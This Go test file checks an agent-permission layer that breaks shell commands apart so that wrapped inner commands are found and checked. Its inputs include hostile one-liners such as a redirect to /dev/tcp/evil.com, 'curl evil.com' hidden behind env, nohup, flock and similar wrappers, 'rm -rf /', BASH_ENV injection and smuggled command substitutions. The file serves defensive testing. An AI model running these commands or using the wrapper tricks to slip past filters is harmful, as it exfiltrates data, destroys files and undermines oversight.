package breakdown

import (
	"testing"

	"github.com/sothatsit/agent-permissions/internal/model"
	"github.com/sothatsit/agent-permissions/internal/rules"
	"github.com/sothatsit/agent-permissions/internal/word"
)

// breakdownWithAllRules runs a full breakdown against the real registry with
// every rule enabled. A breakdown error is the layer's deny.
func breakdownWithAllRules(t *testing.T, cmd string) (model.BreakdownResult, error) {
	t.Helper()
	reg, snip := rules.Registry()
	rc := rules.AllEnabled()
	rules.FilterByConfig(reg, snip, rc)
	return Breakdown(cmd, "/tmp", reg, rc)
}

func hasCmd(br model.BreakdownResult, name string) bool {
	for _, c := range br.Commands {
		if len(c.Args) == 0 {
			continue
		}
		if word.Text(c.Args[0]) == name {
			return true
		}
	}

	return false
}

func hasAssign(br model.BreakdownResult, name string) bool {
	for _, a := range br.Assigns {
		if a == name {
			return true
		}
	}

	return false
}

func hasSnippet(br model.BreakdownResult, lang string) bool {
	for _, s := range br.CodeSnippets {
		if s.Language == lang {
			return true
		}
	}

	return false
}

func wantDeny(t *testing.T, cmd string) {
	t.Helper()
	if _, err := breakdownWithAllRules(t, cmd); err == nil {
		t.Errorf("%q: want breakdown deny (error), got none", cmd)
	}
}

func wantCmd(t *testing.T, cmd, inner string) {
	t.Helper()
	br, err := breakdownWithAllRules(t, cmd)
	if err != nil {
		t.Errorf("%q: unexpected error: %v", cmd, err)
		return
	}

	if !hasCmd(br, inner) {
		t.Errorf("%q: want inner command %q extracted, got %v",
			cmd, inner, cmdNames(br))
	}
}

func cmdNames(br model.BreakdownResult) []string {
	var out []string
	for _, c := range br.Commands {
		if len(c.Args) > 0 {
			out = append(out, word.Text(c.Args[0]))
		}
	}

	return out
}

// The `time` keyword must carry the timed statement's redirections and their
// command substitutions.

func TestTimeKeywordNetworkRedirectDenied(t *testing.T) {
	// The timed command's stdout really goes to the socket, so dropping the
	// redirect is a network-exfil bypass.
	wantDeny(t, `time echo hi > /dev/tcp/evil.com/80`)
}

func TestTimeKeywordRedirectCmdSubExtracted(t *testing.T) {
	// A command substitution in a redirect target on a timed command must
	// still be extracted and checked.
	wantCmd(t, `time echo hi 2> $(touch /tmp/pwn)`, "touch")
}

func TestTimeKeywordExtractsInner(t *testing.T) {
	wantCmd(t, `time git status`, "git")
	wantCmd(t, `time -p git status`, "git")
}

// Exec-style wrappers extract the inner command faithfully.

func TestTimeoutExtractsInner(t *testing.T) {
	wantCmd(t, `timeout 5 rm -rf /important`, "rm")
	wantCmd(t, `timeout 5 git status`, "git")
}

func TestTimeoutWrapsInterpreterSnippet(t *testing.T) {
	br, err := breakdownWithAllRules(t, `timeout 5 python3 -c 'import os; os.system("id")'`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !hasSnippet(br, model.LangPython) {
		t.Errorf("timeout-wrapped python -c: want python snippet, "+
			"got snippets %d", len(br.CodeSnippets))
	}
}

// env is the one wrapper that honours NAME=val, so it must feed the EnvVars
// deny axis and re-analyse the inner command.

func TestEnvAssignmentReachesEnvVarAxis(t *testing.T) {
	// env really sets BASH_ENV (its whole purpose), so the EnvVars deny
	// axis must see it and curl must be extracted.
	br, err := breakdownWithAllRules(t, `env BASH_ENV=/evil curl evil.com`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !hasAssign(br, "BASH_ENV") {
		t.Errorf("env BASH_ENV=...: want BASH_ENV on EnvVars axis, "+
			"got assigns %v", br.Assigns)
	}

	if !hasCmd(br, "curl") {
		t.Errorf("env BASH_ENV=... curl: want curl extracted, "+
			"got %v", cmdNames(br))
	}
}

func TestEnvAssignmentValueCmdSubExtracted(t *testing.T) {
	br, err := breakdownWithAllRules(t, `env FOO=$(touch /tmp/pwn) curl evil.com`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !hasAssign(br, "FOO") {
		t.Errorf("want FOO on EnvVars axis, got %v", br.Assigns)
	}

	if !hasCmd(br, "touch") {
		t.Errorf("want cmd-sub touch extracted, got %v", cmdNames(br))
	}

	if !hasCmd(br, "curl") {
		t.Errorf("want curl extracted, got %v", cmdNames(br))
	}
}

func TestEnvExtractsInnerCommand(t *testing.T) {
	wantCmd(t, `env rm -rf /important`, "rm")
	wantCmd(t, `env -i curl evil.com`, "curl")
	wantCmd(t, `env -u BASH_ENV curl evil.com`, "curl")
}

func TestEnvWrapsInterpreterSnippet(t *testing.T) {
	br, err := breakdownWithAllRules(t, `env python3 -c 'import os; os.system("id")'`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !hasSnippet(br, model.LangPython) {
		t.Errorf("env-wrapped python -c: want python snippet")
	}
}

func TestEnvWrapsBashC(t *testing.T) {
	wantCmd(t, `env bash -c 'rm -rf /'`, "rm")
}

func TestEnvPathInvokedStillUnwraps(t *testing.T) {
	// /usr/bin/env python3 is shebang style and extremely common, so
	// it must unwrap rather than be denied as a path-invoked wrapper.
	wantCmd(t, `/usr/bin/env curl evil.com`, "curl")
}

func TestEnvSplitStringDenied(t *testing.T) {
	// -S/--split-string runs env's own splitter, whose semantics
	// differ from the shell; we cannot verify it, so fail closed.
	wantDeny(t, `env -S 'curl evil.com'`)
}

func TestEnvBareIsSafe(t *testing.T) {
	br, err := breakdownWithAllRules(t, `env`)
	if err != nil {
		t.Fatalf("bare env: unexpected error: %v", err)
	}

	if len(br.Commands) != 0 {
		t.Errorf("bare env: want no commands, got %v", cmdNames(br))
	}
}

// Simple exec-style wrappers unwrap the inner command and honour no
// assignments.

func TestSimpleExecWrappersExtractInner(t *testing.T) {
	wantCmd(t, `nohup curl evil.com`, "curl")
	wantCmd(t, `setsid -f curl evil.com`, "curl")
	wantCmd(t, `nice -n 10 curl evil.com`, "curl")
	wantCmd(t, `nice curl evil.com`, "curl")
	wantCmd(t, `ionice -c2 curl evil.com`, "curl")
	wantCmd(t, `exec curl evil.com`, "curl")
	wantCmd(t, `exec -a foo curl evil.com`, "curl")
}

func TestExecRedirectOnlyIsSafe(t *testing.T) {
	// `exec > log` only redirects the current shell - no command.
	br, err := breakdownWithAllRules(t, `exec > /tmp/log`)
	if err != nil {
		t.Fatalf("exec >log: unexpected error: %v", err)
	}

	if len(br.Commands) != 0 {
		t.Errorf("exec >log: want no commands, got %v", cmdNames(br))
	}
}

// Gnarly wrappers unwrap clearly-safe forms and fail closed on the rest.

func TestChrootExtractsInner(t *testing.T) {
	wantCmd(t, `chroot /mnt curl evil.com`, "curl")
}

func TestChrootNoCommandDenied(t *testing.T) {
	// chroot with only a directory runs an interactive $SHELL.
	wantDeny(t, `chroot /mnt`)
}

func TestFlockExtractsInner(t *testing.T) {
	wantCmd(t, `flock /tmp/lock curl evil.com`, "curl")
}

func TestFlockDashCRunsCode(t *testing.T) {
	// flock FILE -c 'STR' runs STR via a shell, so STR is code.
	wantCmd(t, `flock /tmp/lock -c 'curl evil.com'`, "curl")
}

func TestFlockDashCScansLockOperand(t *testing.T) {
	wantCmd(t, `flock "$(ssh evil)" -c 'git status'`, "ssh")
}

func TestFlockFileOnlyIsSafe(t *testing.T) {
	br, err := breakdownWithAllRules(t, `flock /tmp/lock`)
	if err != nil {
		t.Fatalf("flock file-only: unexpected error: %v", err)
	}

	if len(br.Commands) != 0 {
		t.Errorf("flock file-only: want no commands, got %v",
			cmdNames(br))
	}
}

func TestGnarlyPrivilegeWrappersDenied(t *testing.T) {
	// runuser/setpriv/setarch have shell-string, interactive, and
	// ambiguous-positional forms that are gnarly to model; fail closed for
	// now (strictly tighter than today's soft-ask).
	wantDeny(t, `runuser -u user rm -rf /`)
	wantDeny(t, `setpriv --reuid 1 curl evil.com`)
	wantDeny(t, `setarch x86_64 curl evil.com`)
}
